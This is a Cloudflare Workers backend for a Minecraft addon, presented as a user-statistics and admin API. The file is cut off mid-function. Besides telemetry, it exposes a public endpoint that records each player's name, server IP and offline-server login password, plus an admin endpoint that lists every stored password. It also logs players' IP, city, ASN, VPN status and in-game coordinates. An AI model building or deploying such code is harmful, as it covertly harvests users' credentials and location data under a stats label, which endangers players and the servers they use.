/**
 * Yiyiaddon 用户统计与后台管理 API
 * 部署于 Cloudflare Workers，数据存于 D1
 *
 * 安全约定：
 * 1. 管理员密码不写死在源码，通过 wrangler secret 设置 ADMIN_PASSWORD
 * 2. 登录成功后签发由密码派生的 token，后续管理接口统一用 Bearer token 鉴权
 * 3. 公开接口仅返回脱敏统计；含坐标/IP/血量的完整玩家数据只对管理员开放
 * 4. 注册接口过滤假玩家（Player+数字）与本地回环/局域网测试数据
 * 5. 在线状态仅以心跳为准：/api/heartbeat 每 15 秒上报一次，45 秒无心跳自动离线；断开时调用 /api/offline 立即离线
 */

import { ADMIN_HTML } from './admin-html.js';

// 心跳超时：超过该时长未收到心跳即判定为离线（断开时由 /api/offline 立即触发离线，无需等待）
const HEARTBEAT_TIMEOUT = 45 * 1000;

// 计算字符串的 SHA-256 十六进制摘要，用于生成不可逆的管理员 token
async function sha256(message) {
  const msgBuffer = new TextEncoder().encode(message);
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// 识别离线索码默认名：Player 后接纯数字（例如 Player166），视为测试/假玩家
function isFakePlayerName(name) {
  if (!name) return true;
  const n = String(name).trim();
  if (!n) return true;
  return /^Player\d+$/.test(n);
}

// 识别本地回环与局域网保留地址，本地开发测试不纳入统计
function isLocalServerIp(ip) {
  if (!ip) return false;
  const i = String(ip).toLowerCase().trim();
  return i === 'localhost'
    || i.startsWith('127.')
    || i.startsWith('192.168.')
    || i.startsWith('10.')
    || i.startsWith('0.')
    || /^172\.(1[6-9]|2[0-9]|3[01])\./.test(i)
    || i === '::1' || i === '[::1]';
}

// UUID v3/v4 格式校验，拦截明显伪造的上报
function isValidUuid(uuid) {
  return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(uuid || '');
}

// ══════════════════════════════════════════════════════════════
// 微软正版账号识别：判定 UUID 是否等于「标准离线派生 UUID」
// 离线模式 UUID = Java 的 UUID.nameUUIDFromBytes(("OfflinePlayer:"+名字).getBytes(UTF-8))
// 正版（微软/Mojang 登录）账号 UUID 是随机分配的，绝不会命中该派生值。
// ══════════════════════════════════════════════════════════════

// 内联 MD5（WebCrypto 不支持 MD5），返回 32 位小写十六进制摘要
function md5(message) {
  const rot = (v, c) => (v << c) | (v >>> (32 - c));
  const K = new Int32Array([
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
  ]);
  const S = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
  const bytes = new TextEncoder().encode(String(message));
  const n = bytes.length;
  const padded = new Uint8Array((((n + 8) >>> 6) + 1) << 6);
  padded.set(bytes);
  padded[n] = 0x80;
  const dv = new DataView(padded.buffer);
  dv.setUint32(padded.length - 8, (n << 3) >>> 0, true);
  dv.setUint32(padded.length - 4, Math.floor((n << 3) / 0x100000000), true);

  let a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  for (let off = 0; off < padded.length; off += 64) {
    const M = new Int32Array(16);
    for (let i = 0; i < 16; i++) M[i] = dv.getInt32(off + i * 4, true);
    let A = a0, B = b0, C = c0, D = d0;
    for (let i = 0; i < 64; i++) {
      let f, g;
      if (i < 16) { f = (B & C) | (~B & D); g = i; }
      else if (i < 32) { f = (D & B) | (~D & C); g = (5 * i + 1) & 15; }
      else if (i < 48) { f = B ^ C ^ D; g = (3 * i + 5) & 15; }
      else { f = C ^ (B | ~D); g = (7 * i) & 15; }
      const tmp = D;
      D = C; C = B;
      B = (B + rot((A + f + K[i] + M[g]) | 0, S[i])) | 0;
      A = tmp;
    }
    a0 = (a0 + A) | 0; b0 = (b0 + B) | 0; c0 = (c0 + C) | 0; d0 = (d0 + D) | 0;
  }

  function hex(w) {
    let s = '';
    for (let i = 0; i < 4; i++) s += ((w >>> (i * 8)) & 0xff).toString(16).padStart(2, '0');
    return s;
  }
  return hex(a0) + hex(b0) + hex(c0) + hex(d0);
}

// 计算标准离线模式 UUID（与 Java UUID.nameUUIDFromBytes("OfflinePlayer:名字") 一致）
function offlineUuid(name) {
  const d = md5('OfflinePlayer:' + String(name));
  const variant = (x) => ((parseInt(x, 16) & 0x3) | 0x8).toString(16);
  return d.slice(0, 8) + '-' + d.slice(8, 12) + '-' + '3' + d.slice(13, 16)
    + '-' + variant(d[16]) + d.slice(17, 20) + '-' + d.slice(20, 32);
}

// 判定是否正版：有 XUID 必为正版；否则命中标准离线派生 UUID 判为盗版；未命中派生值视为正版
function computePremium(uuid, name, xuid) {
  if (xuid && String(xuid).trim()) return 1;
  if (!uuid || !name) return 0;
  return offlineUuid(name).toLowerCase() === String(uuid).toLowerCase() ? 0 : 1;
}

// 疑似 VPN/代理/机房的 AS 组织名关键字（服务端能判定的最大程度）
// 说明：服务端只能看到连接来源 IP（梯子出口），无法穿透 VPN 看到真实源 IP。
// 这里通过 AS 组织名识别该 IP 是否属于数据中心/VPN 运营商，作为“疑似梯子”的提示。
const VPN_ORG_KEYWORDS = [
  'cloudflare', 'amazon', 'aws', 'google', 'microsoft', 'azure',
  'digitalocean', 'ovh', 'hetzner', 'linode', 'choopa', 'vultr',
  'm247', 'nord', 'mullvad', 'proton', 'expressvpn', 'surfshark',
  'cyberghost', 'ipvanish', 'datacamp', 'cdn77', 'leaseweb', 'contabo',
  'ionos', 'oracle', 'alibaba', 'aliyun', 'tencent', 'huawei',
  'cogent', 'quadranet', 'hostwinds', 'buyvm', 'zenlayer', 'ipxo',
  'packet', 'equinix', 'psychz', 'hostinger', 'namecheap', 'colocrossing',
  'hivelocity', 'datacenter', 'hosting', 'vpn', 'proxy',
];

const VPN_SUSPECT_ASN = new Set([
  13335, 15169, 16509, 14618, 8075, 14061, 16276, 24940, 20473, 9009,
  63949, 36352, 8100, 40676, 29802, 16265, 51167, 46562, 206092, 62240,
]);

// 判断是否疑似 VPN/代理/机房：命中知名数据中心/VPN ASN 或组织名关键字
function isVpnSuspected(asOrg, asn) {
  if (asn && VPN_SUSPECT_ASN.has(Number(asn))) return 1;
  const org = String(asOrg || '').toLowerCase();
  if (!org) return 0;
  return VPN_ORG_KEYWORDS.some(k => org.includes(k)) ? 1 : 0;
}

// 计算在线状态：仅以心跳时间为准，杜绝回退 last_seen 造成的“假在线”
function computeOnline(heartbeatAt, now) {
  return heartbeatAt && heartbeatAt >= now - HEARTBEAT_TIMEOUT ? 1 : 0;
}

// 管理员登录：校验用户名与密码，返回由密码派生的 token
async function handleLogin(request, env) {
  try {
    const { username, password } = await request.json();
    if (username === env.ADMIN_USERNAME && password === env.ADMIN_PASSWORD) {
      const token = await sha256(env.ADMIN_PASSWORD + '::' + env.ADMIN_USERNAME);
      return jsonResponse({ success: true, token, expiresAt: Date.now() + 7 * 24 * 60 * 60 * 1000 });
    }
    return jsonResponse({ error: '用户名或密码错误' }, 401);
  } catch (e) {
    return jsonResponse({ error: '登录失败' }, 500);
  }
}

// 管理接口鉴权：校验 Authorization: Bearer <token>
// 返回 null 表示通过，否则返回应直接回传的 401/403 响应
async function requireAuth(request, env) {
  const auth = request.headers.get('Authorization') || '';
  if (!auth.startsWith('Bearer ')) {
    return jsonResponse({ error: '未授权' }, 401);
  }
  const token = auth.slice(7);
  const valid = await sha256(env.ADMIN_PASSWORD + '::' + env.ADMIN_USERNAME);
  if (token !== valid) {
    return jsonResponse({ error: '凭证无效' }, 403);
  }
  return null;
}

export default {
  async fetch(request, env) {
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        },
      });
    }

    const url = new URL(request.url);
    const path = url.pathname;

    // 后台管理页面
    if (path === '/' || path === '/admin') {
      return new Response(ADMIN_HTML, {
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
      });
    }

    // 管理员登录（公开）
    if (path === '/api/admin/login' && request.method === 'POST') {
      return handleLogin(request, env);
    }

    // 注册/更新用户（公开，但过滤假玩家与本地测试）
    if (path === '/api/register' && request.method === 'POST') {
      try {
        const {
          uuid, name, version, minecraft_version, server_ip, server_name,
          is_premium, gamertag, xuid, player_activity,
        } = await request.json();

        if (!uuid || !name || !version) {
          return jsonResponse({ error: '缺少必需参数' }, 400);
        }

        // 假玩家与本地测试一律跳过，不计入统计
        if (isFakePlayerName(name) || isLocalServerIp(server_ip)) {
          return jsonResponse({ success: true, skipped: true, reason: 'fake_or_local' });
        }

        if (!isValidUuid(uuid)) {
          return jsonResponse({ error: '无效 UUID' }, 400);
        }

        const now = Date.now();
        // 客户端公网 IP 与地理信息：优先 request.cf，回退到请求头
        const cf = request.cf || {};
        const clientIp = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Real-IP') || 'unknown';
        const clientCountry = cf.country || request.headers.get('CF-IPCountry') || 'unknown';
        const clientCity = cf.city || null;
        const clientRegion = cf.region || null;
        const clientTimezone = cf.timezone || null;
        const clientAsn = cf.asn || null;
        const clientAsOrg = cf.asOrganization || null;
        const vpnSuspected = isVpnSuspected(clientAsOrg, clientAsn);

        // 去重：先按 UUID 查，查不到再按游戏名查。同名不同 UUID 视为同一玩家
        // （正版/离线切换产生不同 UUID），合并到已有记录，避免同名重复入库。
        let existingUser = await env.DB.prepare('SELECT uuid FROM users WHERE uuid = ?').bind(uuid).first();
        if (!existingUser) {
          existingUser = await env.DB.prepare('SELECT uuid FROM users WHERE name = ?').bind(name).first();
        }
        const isNewUser = !existingUser;
        // 实际写入的目标 UUID：存在同名旧记录时沿用旧 UUID，后续 UPDATE 会同步为新 UUID
        const effectiveUuid = existingUser ? existingUser.uuid : uuid;

        // 正版账号判定：有 XUID 必为正版；否则命中标准离线派生 UUID 判为盗版
        const premium = computePremium(uuid, name, xuid);

        const activity = player_activity || {};
        const posX = activity.pos_x ?? null;
        const posY = activity.pos_y ?? null;
        const posZ = activity.pos_z ?? null;
        const dimension = activity.dimension ?? null;
        const health = activity.health ?? null;
        const foodLevel = activity.food_level ?? null;
        const gameMode = activity.game_mode ?? null;
        const currentActivity = activity.current_activity ?? null;

        if (isNewUser) {
          await env.DB.prepare(
            `INSERT INTO users (uuid, name, version, minecraft_version, first_seen, last_seen, usage_count, server_ip, server_name, client_ip, client_country, is_premium,
             pos_x, pos_y, pos_z, dimension, health, food_level, game_mode, current_activity, is_online,
             gamertag, xuid, last_heartbeat, client_city, client_region, client_timezone, client_asn, client_as_org, is_vpn_suspected, status)
             VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
          ).bind(uuid, name, version, minecraft_version || 'unknown', now, now, server_ip || null, server_name || null, clientIp, clientCountry, premium,
            posX, posY, posZ, dimension, health, foodLevel, gameMode, currentActivity,
            gamertag || null, xuid || null, now, clientCity, clientRegion, clientTimezone, clientAsn, clientAsOrg, vpnSuspected, 'multiplayer').run();
        } else {
          await env.DB.prepare(
            `UPDATE users SET uuid = ?, name = ?, version = ?, minecraft_version = ?, last_seen = ?, usage_count = usage_count + 1, server_ip = ?, server_name = ?, client_ip = ?, client_country = ?, is_premium = ?,
             pos_x = ?, pos_y = ?, pos_z = ?, dimension = ?, health = ?, food_level = ?, game_mode = ?, current_activity = ?, is_online = 1,
             gamertag = ?, xuid = ?, last_heartbeat = ?, client_city = ?, client_region = ?, client_timezone = ?, client_asn = ?, client_as_org = ?, is_vpn_suspected = ?, status = 'multiplayer'
             WHERE uuid = ?`
          ).bind(uuid, name, version, minecraft_version || 'unknown', now, server_ip || null, server_name || null, clientIp, clientCountry, premium,
            posX, posY, posZ, dimension, health, foodLevel, gameMode, currentActivity,
            gamertag || null, xuid || null, now, clientCity, clientRegion, clientTimezone, clientAsn, clientAsOrg, vpnSuspected, effectiveUuid).run();
        }

        const stats = await env.DB.prepare('SELECT COUNT(*) as total, COALESCE(SUM(usage_count), 0) as total_uses FROM users').first();
        const rank = isNewUser ? stats.total : await getUserRank(env.DB, uuid);

        return jsonResponse({
          success: true,
          is_new_user: isNewUser,
          rank,
          total_users: stats.total,
          total_uses: stats.total_uses,
        });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 心跳上报（公开，addon 每 15 秒调用一次，维持在线状态并上报延迟/模块/活动）
    // 新增 status 字段：menu 主菜单 / singleplayer 单人世界 / multiplayer 多人服务器，
    // 玩家即使没进多人服务器（主菜单、单人世界）也会上报 IP 国家，后台实时显示其状态。
    if (path === '/api/heartbeat' && request.method === 'POST') {
      try {
        const { uuid, name, server_latency, network_latency, gamertag, xuid, enabled_modules, player_activity, status, server_ip, server_name } = await request.json();
        if (!uuid) return jsonResponse({ error: 'UUID required' }, 400);
        if (isFakePlayerName(name)) return jsonResponse({ success: true, skipped: true, reason: 'fake' });

        const now = Date.now();
        const activity = player_activity || {};
        const modules = typeof enabled_modules === 'string'
          ? enabled_modules
          : (enabled_modules ? JSON.stringify(enabled_modules) : null);

        // 状态归一：仅接受三种合法状态，缺省一律视为多人服务器
        const st = ['menu', 'singleplayer', 'multiplayer'].includes(status) ? status : 'multiplayer';
        // 多人模式下连接本地（回环/局域网）仍视为测试跳过；主菜单/单人世界可正常上报
        if (st === 'multiplayer' && isLocalServerIp(server_ip)) {
          return jsonResponse({ success: true, skipped: true, reason: 'local_server' });
        }

        // 去重：先按 UUID 查，查不到按名字查，同名不同 UUID 合并为同一条记录
        let existing = await env.DB.prepare('SELECT uuid FROM users WHERE uuid = ?').bind(uuid).first();
        if (!existing) {
          existing = await env.DB.prepare('SELECT uuid FROM users WHERE name = ?').bind(name).first();
        }
        const effectiveUuid = existing ? existing.uuid : uuid;
        // 正版账号判定：有 XUID 必为正版；否则命中标准离线派生 UUID 判为盗版
        const premium = computePremium(uuid, name, xuid);

        if (!existing) {
          // 首次心跳早于注册（异常时序）：补一条最小记录
          await env.DB.prepare(
            `INSERT INTO users (uuid, name, version, minecraft_version, first_seen, last_seen, usage_count, is_online, is_premium,
             server_latency, network_latency, gamertag, xuid, enabled_modules, last_heartbeat, server_ip, server_name, status)
             VALUES (?, ?, 'unknown', 'unknown', ?, ?, 1, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
          ).bind(uuid, name || 'unknown', now, now, premium,
            server_latency ?? null, network_latency ?? null, gamertag || null, xuid || null, modules, now,
            server_ip || null, server_name || null, st).run();
        } else {
          await env.DB.prepare(
            `UPDATE users SET uuid = ?, name = COALESCE(?, name), last_seen = ?, is_online = 1, is_premium = ?, status = ?,
             server_latency = ?, network_latency = ?, gamertag = ?, xuid = ?, enabled_modules = ?, last_heartbeat = ?,
             server_ip = COALESCE(?, server_ip), server_name = COALESCE(?, server_name),
             pos_x = ?, pos_y = ?, pos_z = ?, dimension = ?, health = ?, food_level = ?, game_mode = ?, current_activity = ?
             WHERE uuid = ?`
          ).bind(uuid, name || null, now, premium, st,
            server_latency ?? null, network_latency ?? null, gamertag || null, xuid || null, modules, now,
            server_ip || null, server_name || null,
            activity.pos_x ?? null, activity.pos_y ?? null, activity.pos_z ?? null, activity.dimension ?? null,
            activity.health ?? null, activity.food_level ?? null, activity.game_mode ?? null, activity.current_activity ?? null,
            effectiveUuid).run();
        }

        const onlineCount = await env.DB.prepare(
          'SELECT COUNT(*) as c FROM users WHERE last_heartbeat >= ?'
        ).bind(now - HEARTBEAT_TIMEOUT).first();

        return jsonResponse({ success: true, online: onlineCount.c });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 离线上报（公开，addon 在玩家断开服务器时立即调用，第一时间标记离线）
    if (path === '/api/offline' && request.method === 'POST') {
      try {
        const { uuid } = await request.json();
        if (!uuid) return jsonResponse({ error: 'UUID required' }, 400);
        if (!isValidUuid(uuid)) return jsonResponse({ success: true, skipped: true, reason: 'invalid_uuid' });

        await env.DB.prepare('UPDATE users SET is_online = 0, last_heartbeat = NULL WHERE uuid = ?').bind(uuid).run();
        return jsonResponse({ success: true });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 离线服务器密码上报（公开）：玩家进服后，把「玩家名 + 服务器IP + 密码」对应绑定记录
    // 用于在后台「离线密码」页面查看：哪个玩家、在哪个服务器、用了什么密码
    if (path === '/api/offline-server-password' && request.method === 'POST') {
      try {
        const { uuid, name, server_ip, server_name, password, type } = await request.json();
        if (!uuid || !server_ip || !password) return jsonResponse({ error: '缺少必需参数：uuid/server_ip/password' }, 400);
        if (!isValidUuid(uuid)) return jsonResponse({ error: '无效 UUID' }, 400);
        if (isFakePlayerName(name)) return jsonResponse({ success: true, skipped: true, reason: 'fake' });

        await env.DB.prepare(
          'INSERT INTO offline_server_passwords (uuid, name, server_ip, server_name, password, type, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)'
        ).bind(uuid, name || null, server_ip, server_name || null, password, type || 'login', Date.now()).run();

        return jsonResponse({ success: true });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 公开脱敏统计（客户端游戏内展示用，不含隐私字段）
    if (path === '/api/stats' && request.method === 'GET') {
      try {
        const now = Date.now();
        const activeSince = now - 24 * 60 * 60 * 1000;
        const [stats, active, recentUsers] = await env.DB.batch([
          env.DB.prepare('SELECT COUNT(*) as total, COALESCE(SUM(usage_count), 0) as total_uses FROM users'),
          env.DB.prepare('SELECT COUNT(*) as total FROM users WHERE last_seen >= ?').bind(activeSince),
          env.DB.prepare('SELECT uuid, name, version, minecraft_version, last_seen, usage_count, server_name, is_online, last_heartbeat FROM users ORDER BY last_seen DESC LIMIT 50'),
        ]);

        const onlineUsers = recentUsers.results.map(u => ({
          ...u,
          is_online: computeOnline(u.last_heartbeat, now),
        }));

        return jsonResponse({
          total_users: stats.results[0].total,
          total_uses: stats.results[0].total_uses,
          active_users_24h: active.results[0].total,
          generated_at: now,
          recent_users: onlineUsers,
        });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 崩溃上报（公开，addon 全局异常钩子调用，按指纹聚合）
    if (path === '/api/crash/report' && request.method === 'POST') {
      try {
        const { version, minecraft_version, message, stack_trace } = await request.json();
        if (!message && !stack_trace) {
          return jsonResponse({ error: '缺少崩溃信息' }, 400);
        }
        const head = String(stack_trace || '').split('\n').slice(0, 3).join('\n');
        const fingerprint = await sha256(String(message || '') + '\n' + head);
        const now = Date.now();

        const existing = await env.DB.prepare('SELECT id FROM crashes WHERE fingerprint = ?').bind(fingerprint).first();
        if (existing) {
          await env.DB.prepare('UPDATE crashes SET count = count + 1, last_seen = ?, version = ?, minecraft_version = ? WHERE id = ?')
            .bind(now, version || null, minecraft_version || null, existing.id).run();
        } else {
          await env.DB.prepare('INSERT INTO crashes (fingerprint, message, stack_trace, version, minecraft_version, count, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, 1, ?, ?)')
            .bind(fingerprint, message || null, stack_trace || null, version || null, minecraft_version || null, now, now).run();
        }
        return jsonResponse({ success: true, deduplicated: !!existing });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 异常行为上报（公开，addon 检测可疑行为后调用，按指纹聚合）
    if (path === '/api/anomaly/report' && request.method === 'POST') {
      try {
        const { type, severity, message, data, uuid, name, version, minecraft_version } = await request.json();
        if (!type && !message) {
          return jsonResponse({ error: '缺少异常信息' }, 400);
        }
        const fingerprint = await sha256(String(type || '') + '::' + String(message || ''));
        const now = Date.now();

        const existing = await env.DB.prepare('SELECT id FROM anomalies WHERE fingerprint = ?').bind(fingerprint).first();
        if (existing) {
          await env.DB.prepare('UPDATE anomalies SET count = count + 1, last_seen = ?, version = ?, minecraft_version = ? WHERE id = ?')
            .bind(now, version || null, minecraft_version || null, existing.id).run();
        } else {
          await env.DB.prepare(
            'INSERT INTO anomalies (fingerprint, type, severity, message, data, uuid, name, version, minecraft_version, count, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?)'
          ).bind(fingerprint, type || null, severity || 'medium', message || null, data || null, uuid || null, name || null, version || null, minecraft_version || null, now, now).run();
        }
        return jsonResponse({ success: true, deduplicated: !!existing });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 远程配置拉取（公开，addon 轮询）
    if (path === '/api/config' && request.method === 'GET') {
      try {
        const rows = await env.DB.prepare('SELECT key, value FROM configs').all();
        const config = {};
        for (const r of rows.results) config[r.key] = r.value;
        return jsonResponse({ success: true, config, generated_at: Date.now() });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 完整玩家列表（管理员，含坐标/IP/血量/延迟/模块/VPN 判定等敏感数据）
    if (path === '/api/admin/players' && request.method === 'GET') {
      const auth = await requireAuth(request, env);
      if (auth) return auth;

      try {
        const now = Date.now();
        const users = await env.DB.prepare(
          `SELECT uuid, name, version, minecraft_version, first_seen, last_seen, usage_count, server_ip, server_name,
            client_ip, client_country, client_city, client_region, client_timezone, client_asn, client_as_org, is_vpn_suspected,
            is_premium, gamertag, xuid, pos_x, pos_y, pos_z, dimension, health, food_level,
            game_mode, current_activity, is_online, kill_count, death_count, total_playtime,
            server_latency, network_latency, enabled_modules, last_heartbeat, status
           FROM users ORDER BY last_seen DESC`
        ).all();

        const result = users.results.map(u => {
          let modules = [];
          if (u.enabled_modules) {
            try { modules = JSON.parse(u.enabled_modules) || []; } catch (e) { modules = []; }
          }
          return { ...u, is_online: computeOnline(u.last_heartbeat, now), modules,
            is_premium: computePremium(u.uuid, u.name, u.xuid) };
        });

        return jsonResponse({ total: result.length, users: result });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 离线服务器密码列表（管理员）：查看所有「玩家名 + 服务器IP + 密码」记录，按时间倒序
    if (path === '/api/admin/offline-passwords' && request.method === 'GET') {
      const auth = await requireAuth(request, env);
      if (auth) return auth;

      try {
        const rows = await env.DB.prepare(
          'SELECT id, uuid, name, server_ip, server_name, password, type, created_at FROM offline_server_passwords ORDER BY created_at DESC'
        ).all();
        return jsonResponse({ total: rows.results.length, records: rows.results });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 分析接口（管理员）：活跃趋势/国家/版本/击杀死亡/设备/在线/VPN 聚合
    if (path === '/api/admin/analytics' && request.method === 'GET') {
      const auth = await requireAuth(request, env);
      if (auth) return auth;

      try {
        const now = Date.now();
        const DAY = 24 * 60 * 60 * 1000;
        const [versionDist, countryDist, kd, total, online, vpn] = await env.DB.batch([
          env.DB.prepare('SELECT version, COUNT(*) as c FROM users GROUP BY version ORDER BY c DESC'),
          env.DB.prepare('SELECT client_country, COUNT(*) as c FROM users GROUP BY client_country ORDER BY c DESC'),
          env.DB.prepare('SELECT COALESCE(SUM(kill_count),0) as kills, COALESCE(SUM(death_count),0) as deaths, COALESCE(SUM(total_playtime),0) as playtime FROM users'),
          env.DB.prepare('SELECT COUNT(*) as total FROM users'),
          env.DB.prepare('SELECT COUNT(*) as c FROM users WHERE last_heartbeat >= ?').bind(now - HEARTBEAT_TIMEOUT),
          env.DB.prepare('SELECT COUNT(*) as c FROM users WHERE is_vpn_suspected = 1'),
        ]);

        // 正版/离线统计：按 UUID 是否命中标准离线派生值实时判定，避免历史错误数据残留
        const accts = await env.DB.prepare('SELECT uuid, name, xuid FROM users').all();
        let premiumCount = 0;
        for (const a of accts.results) {
          if (computePremium(a.uuid, a.name, a.xuid) === 1) premiumCount++;
        }
        const premiumStats = { premium: premiumCount, offline: accts.results.length - premiumCount };

        // 最近 14 天每日活跃玩家数
        const dailyActive = [];
        for (let i = 13; i >= 0; i--) {
          const start = now - (i + 1) * DAY;
          const end = now - i * DAY;
          const r = await env.DB.prepare('SELECT COUNT(*) as c FROM users WHERE last_seen >= ? AND last_seen < ?').bind(start, end).first();
          dailyActive.push({ date: new Date(end).toISOString().slice(0, 10), active: r.c });
        }

        return jsonResponse({
          version_distribution: versionDist.results,
          country_distribution: countryDist.results,
          premium: premiumStats,
          kills_deaths: kd.results[0],
          total_users: total.results[0].total,
          online_count: online.results[0].c,
          vpn_suspected: vpn.results[0].c,
          daily_active: dailyActive,
          generated_at: now,
        });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 崩溃列表（管理员）
    if (path === '/api/admin/crashes' && request.method === 'GET') {
      const auth = await requireAuth(request, env);
      if (auth) return auth;

      try {
        const rows = await env.DB.prepare('SELECT * FROM crashes ORDER BY last_seen DESC LIMIT 200').all();
        return jsonResponse({ total: rows.results.length, crashes: rows.results });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 异常列表（管理员）
    if (path === '/api/admin/anomalies' && request.method === 'GET') {
      const auth = await requireAuth(request, env);
      if (auth) return auth;

      try {
        const rows = await env.DB.prepare('SELECT * FROM anomalies ORDER BY last_seen DESC LIMIT 200').all();
        return jsonResponse({ total: rows.results.length, anomalies: rows.results });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 配置写入（管理员）
    if (path === '/api/admin/config' && request.method === 'POST') {
      const auth = await requireAuth(request, env);
      if (auth) return auth;

      try {
        const { key, value } = await request.json();
        if (!key) return jsonResponse({ error: '缺少 key' }, 400);
        await env.DB.prepare('INSERT INTO configs (key, value, updated_at) VALUES (?, ?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at')
          .bind(String(key), String(value ?? ''), Date.now()).run();
        return jsonResponse({ success: true });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 发送消息给玩家（管理员，支持目标为空表示广播）
    if (path === '/api/messages/send' && request.method === 'POST') {
      const auth = await requireAuth(request, env);
      if (auth) return auth;

      try {
        const { target_uuid, target_name, message } = await request.json();
        if (!message || !String(message).trim()) {
          return jsonResponse({ error: '消息内容不能为空' }, 400);
        }

        const now = Date.now();
        await env.DB.prepare(
          'INSERT INTO messages (target_uuid, target_name, message, sender, created_at, delivered, from_uuid, from_admin) VALUES (?, ?, ?, ?, ?, 0, NULL, 1)'
        ).bind(target_uuid || null, target_name || '所有人', String(message), 'Admin', now).run();

        return jsonResponse({ success: true, message: '消息已发送', target: target_name || '所有人' });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 聊天历史（管理员，含玩家回复）
    if (path === '/api/messages/history' && request.method === 'GET') {
      const auth = await requireAuth(request, env);
      if (auth) return auth;

      try {
        const messages = await env.DB.prepare(
          'SELECT id, target_uuid, target_name, from_uuid, sender, message, from_admin, created_at, delivered FROM messages ORDER BY created_at DESC LIMIT 500'
        ).all();

        // 关联目标玩家名，方便后台展示
        const result = [];
        for (const m of messages.results) {
          let targetName = m.target_name || null;
          if (!targetName && m.target_uuid) {
            const u = await env.DB.prepare('SELECT name FROM users WHERE uuid = ?').bind(m.target_uuid).first();
            if (u) targetName = u.name;
          }
          result.push({ ...m, target_name: targetName });
        }

        return jsonResponse(result);
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 客户端轮询未读消息（公开，凭玩家 uuid）
    if (path === '/api/messages/poll' && request.method === 'POST') {
      try {
        const { uuid } = await request.json();
        if (!uuid) return jsonResponse({ error: 'UUID required' }, 400);

        // 个人定向消息
        const personal = await env.DB.prepare(
          'SELECT id, message, sender, created_at FROM messages WHERE target_uuid = ? AND delivered = 0 ORDER BY created_at ASC'
        ).bind(uuid).all();

        // 广播消息：发给所有人且该玩家尚未读取
        const broadcast = await env.DB.prepare(
          `SELECT m.id, m.message, m.sender, m.created_at FROM messages m
           WHERE m.target_uuid IS NULL AND m.id NOT IN (SELECT message_id FROM message_reads WHERE player_uuid = ?)
           ORDER BY m.created_at ASC`
        ).bind(uuid).all();

        const all = [...personal.results, ...broadcast.results].sort((a, b) => a.created_at - b.created_at);

        for (const m of personal.results) {
          await env.DB.prepare('UPDATE messages SET delivered = 1, read_at = ? WHERE id = ?').bind(Date.now(), m.id).run();
        }
        for (const m of broadcast.results) {
          await env.DB.prepare('INSERT INTO message_reads (message_id, player_uuid, read_at) VALUES (?, ?, ?)').bind(m.id, uuid, Date.now()).run();
        }

        return jsonResponse({
          success: true,
          count: all.length,
